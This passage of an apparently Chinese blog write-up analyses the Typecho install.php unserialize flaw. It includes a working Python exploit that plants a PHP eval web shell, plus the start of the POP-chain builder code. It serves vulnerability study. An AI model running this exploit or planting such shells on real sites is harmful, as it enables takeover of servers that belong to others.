&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;import requests &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import sys &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;url = &amp;quot;http://localhost/typecho/install.php?finish=&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = &amp;quot;YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIwOiIAVHlwZWNob19GZWVkAF9pdGVtcyI7YToxOntpOjA7YTo1OntzOjU6InRpdGxlIjtzOjE6IjEiO3M6NDoibGluayI7czoxOiIxIjtzOjQ6ImRhdGUiO2k6MTUwODg5NTEzMjtzOjg6ImNhdGVnb3J5IjthOjE6e2k6MDtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjU4OiJmcHV0cyhmb3Blbignc2hlbGwucGhwJywndycpLCc8Pz1AZXZhbCgkX1JFUVVFU1RbNzc3XSk/PicpIjt9czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfZmlsdGVyIjthOjE6e2k6MDtzOjY6ImFzc2VydCI7fX19czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NTg6ImZwdXRzKGZvcGVuKCdzaGVsbC5waHAnLCd3JyksJzw/PUBldmFsKCRfUkVRVUVTVFs3NzddKT8+JykiO31zOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9maWx0ZXIiO2E6MTp7aTowO3M6NjoiYXNzZXJ0Ijt9fX19fXM6NjoicHJlZml4IjtzOjg6InR5cGVjaG9fIjt9&amp;quot; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;postData = &amp;#123;&amp;quot;__typecho_config&amp;quot;:payload&amp;#125; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;header =&amp;#123; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;quot;Referer&amp;quot;:url, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;quot;User-Agent&amp;quot;:&amp;quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0&amp;quot;&amp;#125; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print(url) &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;res = requests.get(url) &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;if res.status_code == 200: &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	print(&amp;quot;[+] install.php exist!&amp;quot;) &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;else: &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	print(&amp;quot;[-] install.php not exist&amp;quot;) &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	sys.exit() &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;res = requests.post(url = url,data = postData,headers = header) &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;res = requests.get(url+&amp;quot;shell.php&amp;quot;) &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;if res.status_code == 200: &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	print(&amp;quot;[+] Shell.php write success!&amp;quot;) &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	print(&amp;quot;Shell path :&amp;quot;,url+&amp;quot;shell.php&amp;quot;) &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;else: &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	print(&amp;quot;[-] GetShell Error!&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221125151707169.png&#34; alt=&#34;image-20221125151707169&#34; style=&#34;zoom: 67%;&#34; /&gt;1&lt;/p&gt;
&lt;p&gt;漏洞分析：&lt;/p&gt;
&lt;p&gt;1.install.php&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221125153310059.png&#34; alt=&#34;image-20221125153310059&#34;&gt;&lt;/p&gt;
&lt;p&gt;这里需要传入一个 finish 参数，然后在 230 行将 cookie 中的__typecho_config 的值通过 base64 解码之后反序列化。&lt;/p&gt;
&lt;p&gt;而__typecho_config 是通过 cookie 传入的，在 install.php 中 528 行，set __typecho_config，并且将其序列化后 base64 编码&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221125153401994.png&#34; alt=&#34;image-20221125153401994&#34;&gt;&lt;/p&gt;
&lt;p&gt;在 cookie.php 中，set 的定义：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221125153457221.png&#34; alt=&#34;image-20221125153457221&#34;&gt;&lt;/p&gt;
&lt;p&gt;2.install.php&lt;/p&gt;
&lt;p&gt;再往下看两行到 232 行，这里将&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;c&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;g&lt;/mi&gt;&lt;msup&gt;&lt;mo stretchy=&#34;false&#34;&gt;[&lt;/mo&gt;&lt;mo mathvariant=&#34;normal&#34; lspace=&#34;0em&#34; rspace=&#34;0em&#34;&gt;′&lt;/mo&gt;&lt;/msup&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;msup&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mo mathvariant=&#34;normal&#34; lspace=&#34;0em&#34; rspace=&#34;0em&#34;&gt;′&lt;/mo&gt;&lt;/msup&gt;&lt;mo stretchy=&#34;false&#34;&gt;]&lt;/mo&gt;&lt;mtext&gt;作为第一个参数传入到&lt;/mtext&gt;&lt;mi&gt;T&lt;/mi&gt;&lt;mi&gt;y&lt;/mi&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;c&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;D&lt;/mi&gt;&lt;/msub&gt;&lt;mi&gt;b&lt;/mi&gt;&lt;mo stretchy=&#34;false&#34;&gt;(&lt;/mo&gt;&lt;mo stretchy=&#34;false&#34;&gt;)&lt;/mo&gt;&lt;mtext&gt;中。&lt;/mtext&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;config[&amp;#x27;adapter&amp;#x27;]作为第一个参数传入到Typecho_Db()中。&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.001892em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.03588em;&#34;&gt;g&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.751892em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;′&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.751892em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;′&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;作&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;为&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;第&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;一&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;个&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;参&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;数&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;传&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;入&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;到&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.13889em;&#34;&gt;T&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.03588em;&#34;&gt;y&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.32833099999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathnormal mtight&#34; style=&#34;margin-right:0.02778em;&#34;&gt;D&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;中&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;。&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;config 就是反序列化传来的对象，因此这个参数也是我们可控的。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221125153932537.png&#34; alt=&#34;image-20221125153932537&#34;&gt;&lt;/p&gt;
&lt;p&gt;3.Db.php&lt;/p&gt;
&lt;p&gt;跟进 Typecho_DB，构造函数中将’Typecho_Db_Adapter_’ 和 $adapterName 做了拼接&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221125154054082.png&#34; alt=&#34;image-20221125154054082&#34;&gt;&lt;/p&gt;
&lt;p&gt;只要 $adapterName 是一个对象，那么这里就会调用其__toString () 方法。刚好，第一个参数是我们可控的。&lt;/p&gt;
&lt;p&gt;4.feed.php&lt;/p&gt;
&lt;p&gt;在 feed.php 中有 to_String 方法，to_String 方法中有如下&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221125154328760.png&#34; alt=&#34;image-20221125154328760&#34;&gt;&lt;/p&gt;
&lt;p&gt;如果我们传入的 author 没有 screennaame 属性，那么就会调用__get () 方法。刚好，这里的 $item 是我们可控的。因此下面就找哪些类没有 screenName 属性，并且__get 方法存在危险操作。&lt;/p&gt;
&lt;p&gt;5.Request.php&lt;/p&gt;
&lt;p&gt;Typecho_Request 类中存在__get 方法&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221125154931232.png&#34; alt=&#34;image-20221125154931232&#34;&gt;&lt;/p&gt;
&lt;p&gt;__get 会调用 get，&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mo&gt;−&lt;/mo&gt;&lt;msub&gt;&lt;mo&gt;&amp;gt;&lt;/mo&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;/msub&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;m&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mtext&gt;也可控，而&lt;/mtext&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;this-&amp;gt; _params也可控，而&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.980548em;vertical-align:-0.286108em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;−&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;&lt;span class=&#34;mrel&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15139200000000003em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathnormal mtight&#34;&gt;p&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.286108em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.68333em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;m&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;也&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;可&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;控&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;，&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;而&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt; key 正是 screenName，因此 $value 可控&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221125155023667.png&#34; alt=&#34;image-20221125155023667&#34;&gt;&lt;/p&gt;
&lt;p&gt;get 调用_applyFilter&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221125155050806.png&#34; alt=&#34;image-20221125155050806&#34;&gt;&lt;/p&gt;
&lt;p&gt;可以看到，这里有个 call_user_func 方法，且&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mtext&gt;和&lt;/mtext&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;filter和&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8888799999999999em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;和&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt; value 都可控。至此这条 pop 链基本是构造完了。&lt;/p&gt;
&lt;p&gt;最后重新分析一下 payload&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	class Typecho_Feed&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		private $_type;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		private $_items = array();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		public function __construct()&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			$this-&amp;gt;_type = &amp;quot;RSS 2.0&amp;quot;;   //因为feed.php中else if (self::RSS2 == $this-&amp;gt;_type)必须为RSS2.0时才能进入elseif&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			$this-&amp;gt;_items = array(      //一次从item中循环每一个属性&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				array(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;					&amp;quot;title&amp;quot; =&amp;gt; &amp;quot;test&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;					&amp;quot;link&amp;quot; =&amp;gt; &amp;quot;test&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;					&amp;quot;data&amp;quot; =&amp;gt; &amp;quot;20190430&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;					&amp;quot;author&amp;quot; =&amp;gt; new Typecho_Request(),   //前三个乱传，最后一个author传入Typecho_Request,因为里面没有screenName属性&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		